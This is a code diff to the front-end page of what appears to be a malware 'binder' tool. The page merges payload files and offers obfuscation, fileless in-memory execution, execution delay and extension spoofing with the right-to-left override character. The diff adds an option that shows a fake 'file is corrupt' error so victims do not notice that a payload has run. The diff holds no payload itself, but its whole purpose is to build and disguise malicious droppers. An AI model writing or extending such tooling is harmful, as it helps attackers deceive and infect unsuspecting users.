@@ -19,6 +19,7 @@ import { Badge } from '@/components/ui/badge';
 import { mergePayloads } from '@/actions/merge-payload-action';
 import { Checkbox } from '@/components/ui/checkbox';
 import { Separator } from '@/components/ui/separator';
+import { Textarea } from '../ui/textarea';
 
 const formSchema = z.object({
   payloadFiles: z.array(z.any()).refine(files => files?.length > 0 && files.every(f => f?.length === 1), "At least one payload file is required."),
@@ -32,6 +33,8 @@ const formSchema = z.object({
   useFragmentation: z.boolean().default(false),
   executionDelay: z.string().optional(),
   fileless: z.boolean().default(true),
+  showFakeError: z.boolean().default(false),
+  fakeErrorMessage: z.string().optional(),
 });
 
 const outputFormats = {
@@ -64,6 +67,8 @@ export default function MergingStationPage() {
       useFragmentation: false,
       executionDelay: '',
       fileless: true,
+      showFakeError: false,
+      fakeErrorMessage: 'The file is corrupt and cannot be opened.',
     },
   });
 
@@ -73,6 +78,7 @@ export default function MergingStationPage() {
   });
 
   const watchObfuscationType = form.watch('obfuscationType');
+  const watchShowFakeError = form.watch('showFakeError');
 
  const applyExtensionSpoofing = (filename: string): string => {
     const parts = filename.split('.');
@@ -131,6 +137,7 @@ export default function MergingStationPage() {
             useFragmentation: values.useFragmentation,
             executionDelay: values.executionDelay,
             fileless: values.fileless,
+            fakeErrorMessage: values.showFakeError ? values.fakeErrorMessage : undefined,
         });
         
         if (!response.success || !response.scriptContent) {
@@ -142,6 +149,7 @@ export default function MergingStationPage() {
         if (values.useFragmentation) log(`Payloads split into fragments.`);
         if (values.fileless) log(`Fileless execution enabled.`);
         if (values.executionDelay) log(`Execution delayed by ${values.executionDelay} seconds.`);
+        if (values.showFakeError) log(`Fake error message enabled.`);
 
         const finalName = values.extensionSpoofing
             ? applyExtensionSpoofing(values.outputName)
@@ -232,6 +240,10 @@ export default function MergingStationPage() {
                    <FormField control={form.control} name="extensionSpoofing" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Extension Spoofing</FormLabel><FormDescription>Use RLO character to mask the true extension.</FormDescription></div></FormItem> )}/>
                    <FormField control={form.control} name="fileless" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Fileless Execution</FormLabel><FormDescription>Run payload in memory instead of writing to disk.</FormDescription></div></FormItem> )}/>
                    <FormField control={form.control} name="executionDelay" render={({ field }) => ( <FormItem><FormLabel>Execution Delay (seconds)</FormLabel><FormControl><Input type="number" placeholder="e.g., 10" {...field} /></FormControl></FormItem> )}/>
+                     <FormField control={form.control} name="showFakeError" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Display Fake Error Message</FormLabel></div></FormItem> )}/>
+                     {watchShowFakeError && (
+                        <FormField control={form.control} name="fakeErrorMessage" render={({ field }) => ( <FormItem><FormLabel>Error Message</FormLabel><FormControl><Textarea placeholder="The file is corrupt..." {...field} /></FormControl><FormMessage /></FormItem> )}/>
+                     )}
                 </CardContent>
               </Card>
               
